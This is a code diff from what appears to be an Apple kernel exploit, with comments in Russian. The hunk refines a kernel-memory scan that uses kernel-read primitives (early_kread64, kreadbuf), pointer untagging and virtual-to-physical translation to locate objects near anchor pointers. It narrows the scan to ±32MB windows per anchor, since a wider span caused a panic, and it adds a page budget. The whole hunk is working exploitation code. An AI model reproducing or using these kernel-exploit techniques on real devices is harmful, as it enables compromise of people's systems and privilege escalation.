@@ -6308,17 +6308,25 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             uint64_t q = saQ[i];
             if (!((uint32_t)q == pfn32 && ((uint32_t)(q >> 32) == 0 || (uint32_t)(q >> 32) == 4))) continue;
             uint64_t pd244 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
-            uint64_t ro244 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x178)) : 0;
-            uint64_t anch[3] = { surfVA, pd244, ro244 };
-            uint64_t mnZ = ~0ULL, mxZ = 0, zva = 0;
-            for (int a = 0; a < 3; a++) if (kpLooksLikeKernelPointer(anch[a])) { if (anch[a] < mnZ) mnZ = anch[a]; if (anch[a] > mxZ) mxZ = anch[a]; }
-            if (mnZ != ~0ULL) {
-                uint64_t lo = (mnZ & ~0x3fffULL) - 0x2000000ULL, hi = (mxZ & ~0x3fffULL) + 0x2000000ULL;
-                for (uint64_t pg = lo; pg < hi && !zva; pg += 0x4000) {
+            // 1.9.245: per-anchor окна ±32MB, НЕ min..max спан — rangeObj-якорь живёт
+            // в VM-полосе 0xffffffdc… и раздувал спан до ~3TB (26 минут скана =
+            // окно мины, паника 063308). planeDesc первым: page-list рядом с MD в GEN3.
+            uint64_t anch[2] = { pd244, surfVA };
+            uint64_t zva = 0;
+            uint32_t pgBudget = 10240;
+            for (int a = 0; a < 2 && !zva && pgBudget; a++) {
+                if (!kpLooksLikeKernelPointer(anch[a])) continue;
+                uint64_t abase = anch[a] & ~0x3fffULL;
+                uint64_t lo = abase - 0x2000000ULL, hi = abase + 0x2000000ULL;
+                uint32_t seen = 0;
+                for (uint64_t pg = lo; pg < hi && !zva && pgBudget; pg += 0x4000) {
                     if (!kpSafeToRead(pg)) continue;
                     uint64_t ppa = kvtophys(pg);
                     int pft = ppa ? kpFrameTypeOf(ppa) : -1;
                     if (!(pft == 0x21 || pft == 0x6 || pft == 0xc)) continue;
+                    pgBudget--;
+                    if (++seen % 1024 == 0)
+                        kpNote(r, [NSString stringWithFormat:@"  [EARLY] zone-скан anchor#%d: %u кандидатов…", a, seen]);
                     uint8_t zbuf[0x4000];
                     kreadbuf(pg, zbuf, sizeof(zbuf));
                     for (uint32_t zo = 0; zo + 8 <= sizeof(zbuf) && !zva; zo += 8) {
